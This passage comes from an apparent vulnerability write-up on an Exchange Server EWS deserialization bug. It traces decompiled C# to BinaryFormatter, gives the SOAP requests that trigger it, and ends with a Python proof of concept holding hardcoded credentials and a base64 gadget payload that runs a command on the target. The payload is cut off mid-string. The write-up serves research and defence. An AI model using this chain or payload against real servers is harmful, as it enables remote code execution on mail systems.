GetProxyInfo(IMinimalCallContext callContext)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (UserConfiguration == null || UserConfiguration.UserConfigurationName == null || UserConfiguration.UserConfigurationName.BaseFolderId == null)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return null;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return BaseServerIdInfoFactory.GetServerInfoForFolderId(callContext, UserConfiguration.UserConfigurationName.BaseFolderId);  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n}\r\n```\r\n\r\nHere we can see that `UserConfiguration` is of type `Microsoft.Exchange.Services.Core.Types.ServiceUserConfiguration` so lets check out that definition:\r\n\r\n```cs\r\n// Microsoft.Exchange.Services.Core.Types.ServiceUserConfiguration  \r\nusing System;  \r\nusing System.Runtime.Serialization;  \r\nusing System.Xml.Serialization;  \r\nusing Microsoft.Exchange.Services.Core.Types;  \r\n  \r\n[Serializable]  \r\n[XmlType(TypeName = \"UserConfigurationType\", Namespace = \"http://schemas.microsoft.com/exchange/services/2006/types\")]  \r\n[DataContract(Namespace = \"http://schemas.datacontract.org/2004/07/Exchange\")]  \r\npublic class ServiceUserConfiguration  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0[XmlElement(\"UserConfigurationName\")]  \r\n\u00a0\u00a0\u00a0\u00a0[DataMember(IsRequired = true, Order = 1)]  \r\n\u00a0\u00a0\u00a0\u00a0public UserConfigurationNameType UserConfigurationName { get; set; }  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0[XmlElement(\"ItemId\")]  \r\n\u00a0\u00a0\u00a0\u00a0[DataMember(Name = \"ItemId\", IsRequired = false, EmitDefaultValue = false, Order = 2)]  \r\n\u00a0\u00a0\u00a0\u00a0public ItemId ItemId { get; set; }  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0[XmlArrayItem(\"DictionaryEntry\", IsNullable = false)]  \r\n\u00a0\u00a0\u00a0\u00a0[DataMember(Name = \"Dictionary\", IsRequired = false, EmitDefaultValue = false, Order = 3)]  \r\n\u00a0\u00a0\u00a0\u00a0public UserConfigurationDictionaryEntry[] Dictionary { get; set; }  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0[XmlElement]  \r\n\u00a0\u00a0\u00a0\u00a0[DataMember(Name = \"XmlData\", IsRequired = false, EmitDefaultValue = false, Order = 4)]  \r\n\u00a0\u00a0\u00a0\u00a0public string XmlData { get; set; }  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0[DataMember(Name = \"BinaryData\", IsRequired = false, EmitDefaultValue = false, Order = 5)]  \r\n\u00a0\u00a0\u00a0\u00a0public string BinaryData { get; set; }  \r\n}\r\n```\r\n\r\nAnd this matches what we saw earlier! Perfect! But one last thing. We saw the example on the web used SOAP, so lets see if we can find a function related to SOAP that handles this function. Expanding this search to `Types and Methods` and searching for `CreateUserConfigurationSoap`, we see that `CreateUserConfigurationSoapRequest` exists as a type, as well as `CreateUserConfigurationSoapResponse`.\r\n\r\n![[Pasted image 20220207211116.png]]\r\n\r\nLets look at the request definition:\r\n\r\n```cs\r\n// Microsoft.Exchange.Services.Wcf.CreateUserConfigurationSoapRequest  \r\nusing System.ServiceModel;  \r\nusing Microsoft.Exchange.Services.Core.Types;  \r\nusing Microsoft.Exchange.Services.Wcf;  \r\n  \r\n[MessageContract(IsWrapped = false)]  \r\npublic class CreateUserConfigurationSoapRequest : BaseSoapRequest  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0[MessageBodyMember(Name = \"CreateUserConfiguration\", Namespace = \"http://schemas.microsoft.com/exchange/services/2006/messages\", Order = 0)]  \r\n\u00a0\u00a0\u00a0\u00a0public CreateUserConfigurationRequest Body;  \r\n}\r\n```\r\n\r\nAlright lets see where that is used. \r\n\r\n![[Pasted image 20220207211256.png]]\r\n\r\nLooks like `BeginCreateUserConfiguration(CreateUserConfigurationSoapRequest soapRequest, AsyncCallback asyncCallback, object asyncState)` uses this.\r\n\r\n```cs\r\n// Microsoft.Exchange.Services.Wcf.EWSService  \r\nusing System;  \r\nusing Microsoft.Exchange.Services.Core.Types;  \r\n  \r\n[PublicEWSVersion]  \r\npublic IAsyncResult BeginCreateUserConfiguration(CreateUserConfigurationSoapRequest soapRequest, AsyncCallback asyncCallback, object asyncState)  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0return soapRequest.Body.ValidateAndSubmit<CreateUserConfigurationResponse>(CallContext.Current, asyncCallback, asyncState);  \r\n}\r\n```\r\n\r\nAlright so now we know where to debug but what is the URL we need? Well we can see this is within the `EWSService` class, so lets see if we can't find a bit of documentation about EWS to help guide us.\r\n\r\nA bit of digging turns up https://docs.microsoft.com/en-us/exchange/client-developer/exchange-web-services/get-started-with-ews-client-applications which mentions that the normal URL is at `/EWS/Exchange.asmx`. However the page also notes that using the AutoDiscover service which is at `https://<domain>/autodiscover/autodiscover.svc`, `https://<domain>/autodiscover/autodiscover.xml`, `https://autodiscover.<domain>/autodiscover/autodiscover.xml`, or `https://autodiscover.<domain>/autodiscover/autodiscover.svc` is meant to be the more appropriate way to do things, however in my experience I haven't found these to contain any info r.e the proper URL to use. Maybe I'll be corrected but for now we'll go off the assumption that `/EWS/Exchange.asmx` is the proper URL.\r\n\r\n## Entry Point Review\r\nWanted to hit `Microsoft.Exchange.Compliance.Serialization.Formatters.TypedBinaryFormatter.Deserialize(Stream, SerializationBinder)` and after tracing this back we found that ultimately this is called via `Microsoft.Exchange.Data.ApplicationLogic.Extension.OrgExtensionSerializer.TryDeserialize(IUserConfiguration userConfiguration, out OrgExtensionRetrievalResult result, out Exception exception)` which will use the `Deserialize` method of `Microsoft.Exchange.Data.ApplicationLogic.Extension.ClientExtensionCollectionFormatter.Deserialize(Stream)` to do the actual deserialization on the `userConfiguration.GetStream()` parameter passed in.\r\n\r\nWe then found that the expected format of the `UserConfiguration` class that `userConfiguration` is an instance of looks like the following snippet:\r\n```xml\r\n<CreateUserConfiguration>\r\n   <UserConfiguration/>\r\n</CreateUserConfiguration>\r\n```\r\n\r\nWhere `UserConfiguration` looks like\r\n```xml\r\n<UserConfiguration> \r\n\t<UserConfigurationName/> \r\n\t<ItemId/> \r\n\t<Dictionary/> \r\n\t<XmlData/> \r\n\t<BinaryData/> \r\n</UserConfiguration>\r\n```\r\n\r\nThis lead us to  `Microsoft.Exchange.Services.Core.Types.CreateUserConfigurationRequest` and later to `Microsoft.Exchange.Services.Core.Types.ServiceUserConfiguration` which confirmed we were processing the right data.\r\n\r\nWe then confirmed that `Microsoft.Exchange.Services.Wcf.CreateUserConfigurationSoapRequest` is where SOAP requests to create the user configuration are handled and that `Microsoft.Exchange.Services.Wcf.EWSService.BeginCreateUserConfiguration(CreateUserConfigurationSoapRequest soapRequest, AsyncCallback asyncCallback, object asyncState)`  uses this to call `soapRequest.Body.ValidateAndSubmit<CreateUserConfigurationResponse>(CallContext.Current, asyncCallback, asyncState);` which will asynchronously create the user configuration and then return a `CreateUserConfigurationResponse` instance containing the response to send back.\r\n\r\nFinally we determined `https://<domain>/EWS/Exchange.asmx` is where we need to send our POST request to hopefully create the `UserConfiguration` object.\r\n\r\nAll of this results in the following chain for the deserialization attack at the moment.\r\n\r\n```cs\r\nMicrosoft.Exchange.Data.ApplicationLogic.Extension.OrgExtensionSerializer.TryDeserialize(IUserConfiguration, out OrgExtensionRetrievalResult, out Exception)\r\n\tMicrosoft.Exchange.Data.ApplicationLogic.Extension.ClientExtensionCollectionFormatter.Deserialize(Stream)\r\n\t\tTypedBinaryFormatter.DeserializeObject(Stream, TypeBinder)\r\n\t\t\tTypedBinaryFormatter.Desearialize(Stream)\r\n\t\t\t\tSystem.Security.Claims.ClaimsPrincipal.OnDeserializedMethod()  \r\n\t\t\t\t   System.Security.Claims.ClaimsPrincipal.DeserializeIdentities()  \r\n\t\t\t\t       BinaryFormatter.Deserialize()\r\n```\r\n\r\n# Creating a ServiceUserConfiguration Object With BinaryData Stream\r\nNow that we have the URL to send the payload to we just need to figure out which field of the `ServiceUserConfiguration` object to set and how this should be done. Looking back at `Microsoft.Exchange.Services.Core.CreateUserConfiguration` code we can see the `Execute()` method calls the `CreateInstance()` method before setting the returned `UserConfiguration` object's properties using `SetProperties()`. \r\n\r\n```cs\r\n// Microsoft.Exchange.Services.Core.CreateUserConfiguration  \r\nusing Microsoft.Exchange.Data.Storage;  \r\nusing Microsoft.Exchange.Diagnostics.Components.Services;  \r\nusing Microsoft.Exchange.Services;  \r\nusing Microsoft.Exchange.Services.Core;  \r\nusing Microsoft.Exchange.Services.Core.Types;  \r\n  \r\ninternal sealed class CreateUserConfiguration : UserConfigurationCommandBase<CreateUserConfigurationRequest, ServiceResultNone>  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0private ServiceUserConfiguration serviceUserConfiguration;  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0public CreateUserConfiguration(ICallContext callContext, CreateUserConfigurationRequest request)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0: base(callContext, request)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0serviceUserConfiguration = request.UserConfiguration;  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ServiceCommandBase<ICallContext>.ThrowIfNull(serviceUserConfiguration, \"serviceUserConfiguration\", \"CreateUserConfiguration::ctor\");  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0internal override IExchangeWebMethodResponse GetResponse()  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return new CreateUserConfigurationResponse  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ResponseMessages =\u00a0  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0new SingleResponseMessage(base.Result.Code, base.Result.Exception)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0};  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0private static UserConfiguration CreateInstance(UserConfigurationName userConfigurationName)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0try  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return userConfigurationName.MailboxSession.UserConfigurationManager.CreateFolderConfiguration(userConfigurationName.Name, UserConfigurationTypes.Stream | UserConfigurationTypes.XML | UserConfigurationTypes.Dictionary, userConfigurationName.FolderId);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0catch (ObjectExistedException ex)  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ExTraceGlobals.ExceptionTracer.TraceError(0L, \"ObjectExistedException during UserConfiguration creation: {0} Name {1} FolderId: {2}\", ex, userConfigurationName.Name, userConfigurationName.FolderId);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0throw new ErrorItemSaveException(CoreResources.IDs.ErrorItemSaveUserConfigurationExists, ex);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n  \r\n\u00a0\u00a0\u00a0\u00a0internal override ServiceResult<ServiceResultNone> Execute()  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0UserConfigurationCommandBase<CreateUserConfigurationRequest, ServiceResultNone>.ValidatePropertiesForUpdate(serviceUserConfiguration);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0using (UserConfiguration userConfiguration = CreateInstance(GetUserConfigurationName(serviceUserConfiguration.UserConfigurationName)))  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0UserConfigurationCommandBase<CreateUserConfigurationRequest, ServiceResultNone>.SetProperties(serviceUserConfiguration, userConfiguration);  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0userConfiguration.Save();  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return new ServiceResult<ServiceResultNone>(new ServiceResultNone());  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n}\r\n```\r\n\r\nLets take a deeper look into the `SetProperties()` code:\r\n\r\n```cs\r\n// Microsoft.Exchange.Services.Core.UserConfigurationCommandBase<TRequestType,SingleItemType>  \r\nusing Microsoft.Exchange.Data.Storage;  \r\nusing Microsoft.Exchange.Services.Core.Types;  \r\n  \r\nprotected static void SetProperties(ServiceUserConfiguration serviceUserConfiguration, UserConfiguration userConfiguration)  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0SetDictionary(serviceUserConfiguration, userConfiguration);  \r\n\u00a0\u00a0\u00a0\u00a0SetXmlStream(serviceUserConfiguration, userConfiguration);  \r\n\u00a0\u00a0\u00a0\u00a0SetStream(serviceUserConfiguration, userConfiguration);  \r\n}\r\n```\r\n\r\nAh, interesting, so `SetProperties()` sets both an XML stream with `SetXmlStream()` and sets another stream, likely binary, with `SetStream()`. Lets confirm this is using the `BinaryData` field mentioned earlier by looking at the code for `SetStream()`:\r\n\r\n```cs\r\n// Microsoft.Exchange.Services.Core.UserConfigurationCommandBase<TRequestType,SingleItemType>  \r\nusing System.IO;  \r\nusing Microsoft.Exchange.Data.Storage;  \r\nusing Microsoft.Exchange.Services.Core.Types;  \r\n  \r\nprivate static void SetStream(ServiceUserConfiguration serviceUserConfiguration, UserConfiguration userConfiguration)  \r\n{  \r\n\u00a0\u00a0\u00a0\u00a0if (serviceUserConfiguration.BinaryData == null)  \r\n\u00a0\u00a0\u00a0\u00a0{  \r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return;  \r\n\u00a0\u00a0\u00a0\u00a0}  \r\n\u00a0\u00a0\u00a0\u00a0using Stream stream = GetStream(userConfiguration);  \r\n\u00a0\u00a0\u00a0\u00a0SetStreamPropertyFromBase64String(serviceUserConfiguration.BinaryData, stream, CoreResources.IDs.ErrorInvalidValueForPropertyBinaryData);  \r\n}\r\n```\r\n\r\nLooks like it is indeed using `serviceUserConfiguration.BinaryData`, confirming that this is the field we need to set in order to set the stream. **Note that the `BinaryData` blob must be a Base64 encoded string due to the `SetStreamPropertyFromBase64String()` call here.**\r\n\r\nSo therefore our chain to create a `ServiceUserConfiguration` object with a `BinaryData` stream looks like this:\r\n\r\n```\r\nCreateUserConfiguration.Execute()\r\n\tUserConfigurationCommandBase.SetProperties()\r\n\t\tUserConfigurationCommandBase.SetStream()\t\t\t\r\n```\r\n\r\n# Chaining Everything Together\r\nSo looks like first we need to make the `UserConfiguration` and apply that. We can do that via a web server SOAP request to `/EWS/Exchange.asmx` that looks like the following which will create a `UserConfiguration` object with a `Dictionary` XML element which as noted at https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/dictionary, defines a set of dictionary property entries for a user configuration object. These dictionary properties are controlled by a `DictionaryEntry` XML element which comprises a `DictionaryKey`, which has a `Type` field (aka type of the key) and a `Value` field (aka name of the key), and a `DictionaryValue` object which has the same fields used to control the value of the key.\r\n\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\r\n               xmlns:m=\"https://schemas.microsoft.com/exchange/services/2006/messages\"\r\n               xmlns:t=\"https://schemas.microsoft.com/exchange/services/2006/types\"\r\n               xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\r\n               xmlns:xs=\"http://www.w3.org/2001/XMLSchema\">\r\n  \r\n  <soap:Header>\r\n    <t:RequestServerVersion Version=\"Exchange2013\" />\r\n  </soap:Header>\r\n  <soap:Body>\r\n    <m:CreateUserConfiguration>\r\n      <m:UserConfiguration>\r\n        <t:UserConfigurationName Name=\"TestConfig\">\r\n          <t:Folder Id=\"id\" ChangeKey=\"id\">\r\n          </t:Folder>\r\n        </t:UserConfigurationName>\r\n\t\t<t:BinaryData>\r\n\t\t\tDESERIALIZE_PAYLOAD_GOES_HERE_AS_BASE64_ENCODED_STRING\r\n\t\t</t:BinaryData>\r\n        <t:Dictionary>\r\n          <t:DictionaryEntry>\r\n            <t:DictionaryKey>\r\n              <t:Type>String</t:Type>\r\n              <t:Value>PhoneNumber</t:Value>\r\n            </t:DictionaryKey>\r\n            <t:DictionaryValue>\r\n              <t:Type>String</t:Type>\r\n              <t:Value>555-555-1111</t:Value>\r\n            </t:DictionaryValue>\r\n          </t:DictionaryEntry>\r\n        </t:Dictionary>\r\n      </m:UserConfiguration>  \r\n    </m:CreateUserConfiguration>\r\n  </soap:Body>\r\n</soap:Envelope>\r\n```\r\n\r\n# Tracing the Deserialization Back to An Accessible Source\r\nAfter a lot of tracing through interfaces we finally end up getting the following full deserialization chain from an accessible source. As you can see its quite long at 24 calls (including interfaces, so probably around 18 or so actual calls, but still its a lot!!!)\r\n\r\n```cs\r\n\tMicrosoft.Exchange.Services.Core.GetClientAccessToken.PreExecuteCommand()\r\n\tMicrosoft.Exchange.Services.Core.GetClientAccessToken.PrepareForExtensionRelatedTokens()\r\n\tMicrosoft.Exchange.Services.Core.GetClientAccessToken.GetUserExtensionDataList(HashSet<string>)\r\n\tMicrosoft.Exchange.Services.Wcf.GetExtensibilityContext.GetUserExtensionDataListWithoutUpdatingCache(ICallContext, HashSet<string>)\r\n\tMicrosoft.Exchange.Services.Wcf.GetExtensibilityContext.GetUserExtensions(ICallContext, bool, bool, bool, ExtensionsCache, HashSet<OfficeMarketplaceExtension>, bool, bool, bool, Version, bool)\r\n\tMicrosoft.Exchange.Services.Wcf.GetExtensibilityContext.GetExtensions(ICallContext, bool, bool, bool, OrgEmptyMasterTableCache, ExtensionsCache, HashSet<OfficeMarketplaceExtension>, bool, bool, int?, bool, out string, bool, bool, Version, bool)  \r\n\tMicrosoft.Exchange.Data.ApplicationLogic.Extension.InstalledExtensionTable.GetExtensions(HashSet<OfficeMarketplaceExtension>, bool, bool, bool, out string, CultureInfo, bool, bool, MultiValuedProperty<Capability>, bool)\r\n\tMicrosoft.Exchange.Data.ApplicationLogic.Extension.InstalledExtensionTable.GetProvidedExtensions(HashSet<OfficeMarketplaceExtension>, bool, Dictionary<string,ExtensionData>, bool, bool, out string, bool)\r\n\tMicrosoft.Exchange.Data.ApplicationLogic.Extension.InstalledExtensionTable.GetOrgProvidedExtensions(HashSet<OfficeMarketplaceExtension>, bool, Dictionary<string,ExtensionData>, bool, bool, out string, bool)\r\n\tMicrosoft.Exchange.Data.ApplicationLogic.Extension.OrgExtensionTable.GetOrgExtensions(IOrgExtensionDataGetter, OrgExtensionRetrievalContext, bool, bool)\r\n\tMicrosoft.Exchange.Data.ApplicationLogic.Extension.IOrgExtensionDataGetter.GetAllOrgExtensionData(OrgExtensionRetrievalContext): IEnumerable<IExtensionData>\r\n\tMicrosoft.Exchange.Data.ApplicationLogic.Extension.OrgExtensionDataGetter.GetAllOrgExtensionData(OrgExtensionRetrievalContext): IEnumerable<IExtensionData>\r\n\tMicrosoft.Exchange.Data.ApplicationLogic.Extension.IOrgExtensionRetriever.Retrieve(OrgExtensionRetrievalContext)\r\n\tMicrosoft.Exchange.Data.ApplicationLogic.Extension.CachedOrgExtensionRetriever.Retrieve(OrgExtensionRetrievalContext) : OrgExtensionRetrievalResult\r\n\tMicrosoft.Exchange.Data.ApplicationLogic.Extension.CachedOrgExtensionRetriever.TryDeserializeExtensionsFromCache(out OrgExtensionRetrievalresult)\r\n\tMicrosoft.Exchange.Data.ApplicationLogic.Extension.IOrgExtensionSerializer.TryDeserialize(IUserConfiguration, out OrgExtensionRetrievalResult, out Exception)\r\n\tMicrosoft.Exchange.Data.ApplicationLogic.Extension.OrgExtensionSerializer.TryDeserialize(IUserConfiguration, out OrgExtensionRetrievalResult, out Exception)\r\n\t\tMicrosoft.Exchange.Data.ApplicationLogic.Extension.IClientExtensionCollectionFormatter.Deserialize\r\n\t\t\tMicrosoft.Exchange.Data.ApplicationLogic.Extension.ClientExtensionCollectionFormatter.Deserialize(Stream)\r\n\t\t\t\tTypedBinaryFormatter.DeserializeObject(Stream, TypeBinder)\r\n\t\t\t\t\tTypedBinaryFormatter.Deserialize(Stream)\r\n\t\t\t\t\t\tSystem.Security.Claims.ClaimsPrincipal.OnDeserializedMethod()  \r\n\t\t\t\t\t\t   System.Security.Claims.ClaimsPrincipal.DeserializeIdentities()  \r\n\t\t\t\t\t\t       BinaryFormatter.Deserialize()\r\n```\r\n\r\nWe need to find a way to hit this function from an accessible location. **I made a mistake here in thinking that cause we were retrieving info from the cache it wouldn't be an exploitable path. Don't assume based purely off of names the whole path chain, take a look at everything first.**\r\n\r\nAnyway we can then find that by Googling `GetClientAccessToken` that we can make a SOAP request for this given documentation at https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/getclientaccesstoken-operation and that  `The GetClientAccessToken operation gets a client access token for a mail app for Outlook.` mean that its real purpose is simply to get a client token for a given mail app in Outlook. Interesting that such a benign operation triggers this chain bug it does make sense. After all some of this is getting the list of extensions for a given org, likely to find the respective app,  which then leads us to the `Microsoft.Exchange.Data.ApplicationLogic.Extension.CachedOrgExtensionRetriever.TryDeserializeExtensionsFromCache(out OrgExtensionRetrievalresult)` call that ultimately leads to more calls and the then the `TypedBinaryFormatter.Deserialize(Stream)` call where the bug is at.\r\n\r\nFor reference the data we need to send here will look something like this:\r\n\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?> \r\n<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:t=\"https://schemas.microsoft.com/exchange/services/2006/types\" xmlns:m=\"https://schemas.microsoft.com/exchange/services/2006/messages\"> \r\n\t<soap:Header> \r\n\t\t<t:RequestServerVersion Version=\"Exchange2013\" /> \r\n\t</soap:Header> \r\n\t<soap:Body> \r\n\t\t<m:GetClientAccessToken> \r\n\t\t\t<m:TokenRequests> \r\n\t\t\t\t<t:TokenRequest> \r\n\t\t\t\t\t<t:Id>1C50226D-04B5-4AB2-9FCD-42E236B59E4B</t:Id> \r\n\t\t\t\t\t<t:TokenType>CallerIdentity</t:TokenType>\r\n\t\t\t\t</t:TokenRequest> \r\n\t\t\t</m:TokenRequests> \r\n\t\t</m:GetClientAccessToken> \r\n\t</soap:Body> \r\n</soap:Envelope>\r\n```\r\n# Shell\r\nFollowing PoC will spawn `calc.exe` on the target:\r\n\r\n```python\r\n#!/usr/bin/python3\r\nimport socket, time\r\n\r\nimport http.client, requests\r\nimport urllib.request, urllib.parse, urllib.error\r\nimport os, ssl\r\n\r\nfrom requests_ntlm2 import HttpNtlmAuth\r\nfrom urllib3.exceptions import InsecureRequestWarning\r\n\r\nrequests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)\r\nimport base64\r\n\r\n\r\nUSER = 'TESTINGDOMAIN\\\\administrator'\r\nPASS = 'thePassword123!'\r\n\r\ntarget = \"https://172.26.247.94\"\r\n\r\n#rcegadget\r\n#pop calc or mspaint on the target\r\ngadgetData = 'AAEAAAD/////AQAAAAAAAAAEAQAAACZTeXN0ZW0uU2VjdXJpdHkuQ2xhaW1zLkNsYWltc1ByaW5jaXBhbAEAAAAcbV9zZXJpYWxpemVkQ2xhaW1zSWRlbnRpdGllcwEGBQAAALAXQUFFQUFBRC8vLy8vQVFBQUFBQUFBQUFNQWdBQUFFbFRlWE4wWlcwc0lGWmxjbk5wYjI0OU5DNHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajFpTnpkaE5XTTFOakU1TXpSbE1EZzVCUUVBQUFDRUFWTjVjM1JsYlM1RGIyeHNaV04wYVc5dWN5NUhaVzVsY21sakxsTnZjblJsWkZObGRHQXhXMXRUZVhOMFpXMHVVM1J5YVc1bkxDQnRjMk52Y214cFlpd2dWbVZ5YzJsdmJqMDBMakF1TUM0d0xDQkRkV3gwZFhKbFBXNWxkWFJ5WVd3c0lGQjFZbXhwWTB0bGVWUnZhMlZ1UFdJM04yRTFZelUyTVRrek5HVXdPRGxkWFFRQUFBQUZRMjkxYm5RSVEyOXRjR0Z5WlhJSFZtVnljMmx2YmdWSmRHVnRjd0FEQUFZSWpRRlRlWE4wWlcwdVEyOXNiR1ZqZEdsdmJuTXVSMlZ1WlhKcFl5NURiMjF3WVhKcGMyOXVRMjl0Y0dGeVpYSmdNVnRiVTNsemRHVnRMbE4wY21sdVp5d2diWE5qYjNKc2FXSXNJRlpsY25OcGIyNDlOQzR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1WFYwSUFnQUFBQUlBQUFBSkF3QUFBQUlBQUFBSkJBQUFBQVFEQUFBQWpRRlRlWE4wWlcwdVEyOXNiR1ZqZEdsdmJuTXVSMlZ1WlhKcFl5NURiMjF3WVhKcGMyOXVRMjl0Y0dGeVpYSmdNVnRiVTNsemRHVnRMbE4wY21sdVp5d2diWE5qYjNKc2FXSXNJRlpsY25OcGIyNDlOQzR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1WFYwQkFBQUFDMTlqYjIxd1lYSnBjMjl1QXlKVGVYTjBaVzB1UkdWc1pXZGhkR1ZUWlhKcFlXeHBlbUYwYVc5dVNHOXNaR1Z5Q1FVQUFBQVJCQUFBQUFJQUFBQUdCZ0FBQUFvdll5QmpiV1F1WlhobEJnY0FBQUFEWTIxa0JBVUFBQUFpVTNsemRHVnRMa1JsYkdWbllYUmxVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjZ01BQUFBSVJHVnNaV2RoZEdVSGJXVjBhRzlrTUFkdFpYUm9iMlF4QXdNRE1GTjVjM1JsYlM1RVpXeGxaMkYwWlZObGNtbGhiR2w2WVhScGIyNUliMnhrWlhJclJHVnNaV2RoZEdWRmJuUnllUzlUZVhOMFpXMHVVbVZtYkdWamRHbHZiaTVOWlcxaVpYSkpibVp2VTJWeWFXRnNhWHBoZEdsdmJraHZiR1JsY2k5VGVYTjBaVzB1VW1WbWJHVmpkR2x2Ymk1TlpXMWlaWEpKYm1adlUyVnlhV0ZzYVhwaGRHbHZia2h2YkdSbGNna0lBQUFBQ1FrQUFBQUpDZ0FBQUFRSUFBQUFNRk41YzNSbGJTNUVaV3hsWjJGMFpWTmxjbWxoYkdsNllYUnBiMjVJYjJ4a1pYSXJSR1ZzWldkaGRHVkZiblJ5ZVFjQUFBQUVkSGx3WlFoaGMzTmxiV0pzZVFaMFlYSm5aWFFTZEdGeVoyVjBWSGx3WlVGemMyVnRZbXg1RG5SaGNtZGxkRlI1Y0dWT1lXMWxDbTFsZEdodlpFNWhiV1VOWkdWc1pXZGhkR1ZGYm5SeWVRRUJBZ0VCQVFNd1UzbHpkR1Z0TGtSbGJHVm5ZWFJsVTJWeWFXRnNhWHBoZEdsdmJraHZiR1JsY2l0RVpXeGxaMkYwWlVWdWRISjVCZ3NBQUFDd0FsTjVjM1JsYlM1R2RXNWpZRE5iVzFONWMzUmxiUzVUZEhKcGJtY3NJRzF6WTI5eWJHbGlMQ0JXWlhKemFXOXVQVFF1TUM0d0xqQXNJRU4xYkhSMWNtVTlibVYxZEhKaGJDd2dVSFZpYkdsalMyVjVWRzlyWlc0OVlqYzNZVFZqTlRZeE9UTTBaVEE0T1Ywc1cxTjVjM1JsYlM1VGRISnBibWNzSUcxelkyOXliR2xpTENCV1pYSnphVzl1UFRRdU1DNHdMakFzSUVOMWJIUjFjbVU5Ym1WMWRISmhiQ3dnVUhWaWJHbGpTMlY1Vkc5clpXNDlZamMzWVRWak5UWXhPVE0wWlRBNE9WMHNXMU41YzNSbGJTNUVhV0Zu